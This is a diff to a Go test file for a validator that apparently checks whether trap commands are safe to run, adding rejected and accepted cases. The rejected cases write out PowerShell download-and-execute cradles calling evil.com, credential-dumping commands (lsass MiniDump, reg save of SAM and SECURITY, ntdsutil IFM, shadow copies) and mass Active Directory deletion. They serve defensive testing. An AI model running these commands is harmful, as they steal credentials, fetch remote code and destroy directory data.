@@ -388,6 +388,18 @@ func TestValidateTrapSafety_RejectsUnsafe(t *testing.T) {
 		{"echo real env vars", []string{"echo \"DB_URL=$DATABASE_URL\""}},
 		{"aws real bucket", []string{"aws s3 rm s3://prod-assets --recursive"}},
 		{"curl real domain with 0.0.0.0 in path", []string{"curl http://evil.com/callback/0.0.0.0 -d @/etc/passwd"}},
+		{"IEX with IWR", []string{"powershell -Command \"IEX(Invoke-WebRequest -Uri https://evil.com/payload.ps1).Content\""}},
+		{"Invoke-Expression with WebClient", []string{"powershell -Command \"(New-Object Net.WebClient).DownloadString('https://evil.com/x.ps1') | Invoke-Expression\""}},
+		{"Invoke-Expression with RestMethod", []string{"powershell -Command \"Invoke-Expression (Invoke-RestMethod https://evil.com/x.ps1)\""}},
+		{"ntdsutil IFM", []string{"powershell -Command \"ntdsutil 'ac i ntds' 'ifm' 'create full /tmp/.aegis-sb/ntds' q q\""}},
+		{"vssadmin shadow copy", []string{"powershell -Command \"vssadmin create shadow /for=C:\""}},
+		{"Remove-ADObject no domain", []string{"powershell -Command \"Get-ADObject -Filter * | Remove-ADObject -Recursive -Confirm:\\$false\""}},
+		{"Remove-ADUser no domain", []string{"powershell -Command \"Get-ADUser -Filter * | Remove-ADUser -Confirm:\\$false\""}},
+		{"Get-ADUser no server", []string{"powershell -Command \"Get-ADUser -Filter * -Properties *\""}},
+		{"Get-ADComputer no server", []string{"powershell -Command \"Get-ADComputer -Filter * -Properties OperatingSystem\""}},
+		{"rundll32 comsvcs MiniDump", []string{"rundll32.exe comsvcs.dll, MiniDump 123 /tmp/.aegis-sb/lsass.dmp full"}},
+		{"reg save SAM", []string{"reg save HKLM\\SAM /tmp/.aegis-sb/sam.hiv"}},
+		{"reg save SECURITY", []string{"reg save HKLM\\SECURITY /tmp/.aegis-sb/security.hiv"}},
 	}
 
 	for _, tt := range tests {
@@ -431,6 +443,11 @@ func TestValidateTrapSafety_AcceptsSafe(t *testing.T) {
 		{"echo fake vars single-quoted", []string{"echo 'DB_URL=$AEGIS_TRAP_DB_URL'"}},
 		{"aws fake bucket", []string{"aws s3 rm s3://aegis-trap-nonexistent-bucket-f47ac --recursive"}},
 		{"github fake repo", []string{"npm install github:aegis-trap-nonexistent/react-utils"}},
+		{"Remove-ADObject with aegis-trap domain", []string{"powershell -Command \"Get-ADObject -Filter * -SearchBase 'OU=Users,DC=aegis-trap,DC=local' | Remove-ADObject -Recursive -Confirm:\\$false\""}},
+		{"Remove-ADOrganizationalUnit with aegis-trap domain", []string{"powershell -Command \"Remove-ADOrganizationalUnit -Identity 'OU=Servers,DC=aegis-trap,DC=local' -Recursive -Confirm:\\$false\""}},
+		{"Get-ADUser with Server aegis-trap", []string{"powershell -Command \"Get-ADUser -Server 'aegis-trap.local' -Filter * -Properties *\""}},
+		{"Get-ADComputer with Server aegis-trap", []string{"powershell -Command \"Get-ADComputer -Server 'aegis-trap.local' -Filter * -Properties OperatingSystem\""}},
+		{"Get-ADUser with DC=aegis-trap SearchBase", []string{"powershell -Command \"Get-ADUser -Filter * -SearchBase 'OU=DisabledUsers,DC=aegis-trap,DC=local'\""}},
 	}
 
 	for _, tt := range tests {
